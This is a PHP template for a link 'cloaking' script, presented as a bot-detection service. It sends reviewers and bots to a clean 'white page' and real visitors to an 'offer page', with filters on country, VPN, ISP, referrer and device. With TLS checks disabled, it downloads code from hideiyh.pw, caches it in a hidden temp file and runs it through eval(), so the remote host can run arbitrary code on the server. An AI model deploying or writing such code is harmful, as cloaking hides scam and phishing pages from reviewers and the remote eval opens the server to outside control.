<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

/**
 *                                              
 *                                                             
 * ██  ██ ██ ████▄  ██████ ██ ██  ██ ██  ██   █████▄ ██     ██ 
 * ██████ ██ ██  ██ ██▄▄   ██  ▀██▀  ██████   ██▄▄█▀ ██ ▄█▄ ██ 
 * ██  ██ ██ ████▀  ██▄▄▄▄ ██   ██   ██  ██ ▄ ██      ▀██▀██▀  
 *  
 * ==================================================================================
 * | Secure Your Links with Built-in Bot Detection API
 * ==================================================================================
 */
$CONFIG['APIKEY'] = '{API_KEY}';
$CONFIG['uniqid'] = '{uniqid}';
$CONFIG['flow_name'] = '{flow_name}';

// Cloaking settings.
$CONFIG['render_white_page'] = '{render_white_page}';
$CONFIG['white_page_url'] = '{white_page_url}';
$CONFIG['render_bot_page'] = '{render_bot_page}';
$CONFIG['bot_page_url'] = '{bot_page_url}';
$CONFIG['render_offer_page'] = '{render_offer_page}';
$CONFIG['offer_page_url'] = '{offer_page_url}';

// Bot detection settings.
$CONFIG['allowed_countries'] = '{allowed_countries}';
$CONFIG['block_vpn'] = '{block_vpn}';
$CONFIG['block_no_referer'] = '{block_no_referer}';
$CONFIG['allowed_params'] = '{allowed_params}';
$CONFIG['acs'] = '{acs}';
$CONFIG['blocker_bots'] = '{blocker_bots}';
$CONFIG['lock_isp'] = '{lock_isp}';
$CONFIG['lock_referers'] = '{lock_referers}';
$CONFIG['lock_device'] = '{lock_device}';
$CONFIG['lock_browser'] = '{lock_browser}';

define('CONFIG', $CONFIG);

if (!function_exists('__site_domain')) {
    function __site_domain()
    {
        $domain = '';
        if (!empty($_SERVER['HTTP_X_FORWARDED_HOST'])) {
            $domain = $_SERVER['HTTP_X_FORWARDED_HOST'];
        } elseif (!empty($_SERVER['HTTP_HOST'])) {
            $domain = $_SERVER['HTTP_HOST'];
        } elseif (!empty($_SERVER['SERVER_NAME'])) {
            $domain = $_SERVER['SERVER_NAME'];
        }

        $domain = preg_replace('/:\d+$/', '', $domain);
        return strtolower($domain);
    }
}

if (!function_exists('__fast_request')) {
    function __fast_request($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'X-HIDEIYH-APIKEY: ' . CONFIG['APIKEY'],
            'X-HIDEIYH-DOMAIN: ' . __site_domain(),
        ]);
        $response = curl_exec($ch);

        if (curl_errno($ch) || empty($response)) {
            $options = [
                'http' => [
                    'header' => "X-HIDEIYH-APIKEY: " . CONFIG['APIKEY'] . "\r\nX-HIDEIYH-DOMAIN: " . __site_domain() . "\r\n"
                ]
            ];
            $context = stream_context_create($options);
            $response = @file_get_contents($url, false, $context);
        }

        curl_close($ch);
        return $response;
    }
}

$cache_file = sys_get_temp_dir() . '/.hideiyh_flow_base_' . md5(CONFIG['APIKEY']);
$cache_ttl = 3600; // 1 hour

if (file_exists($cache_file) && (time() - filemtime($cache_file)) < $cache_ttl) {
    $core = @file_get_contents($cache_file);
} else {
    $core = __fast_request('https://hideiyh.pw/api/flow-base');
    if ($core) {
        @file_put_contents($cache_file, $core);
    }
}

if ($core) {
    eval($core);
}
